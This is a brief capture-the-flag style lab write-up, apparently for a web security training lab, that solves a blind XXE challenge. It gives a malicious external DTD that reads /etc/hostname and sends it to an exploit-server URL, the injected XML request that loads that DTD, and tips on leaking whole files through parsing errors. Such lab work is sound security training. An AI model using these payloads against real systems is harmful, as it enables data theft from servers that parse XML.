# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

Description :  This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

Analysis:

By hosting our external DTD Containing this data

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://exploit-0a87004b041a6aab815c249801ec00a2.exploit-server.net/exploit/exfiltrate?testing=%file;'>">
%eval;
%error;
``` @ https://exploit-0a87004b041a6aab815c249801ec00a2.exploit-server.net/exploit

and using this direct request 

```XML
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE testing
[<!ENTITY % invoke SYSTEM "https://exploit-0a87004b041a6aab815c249801ec00a2.exploit-server.net/exploit"> %invoke;] >
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

```

Lab done ,
Note : note that if the desired filed contained data that cant be sended via URL directly , it may disclouse the first line only OR raise a parsing error and doesn't disclouse anything at all (that the case in this lab)

-> To disclouse the full files try

- Parsing errors
  - Directly (using local DTD)
  - Hosting ur malicous DTD That triggers the error after parsing it
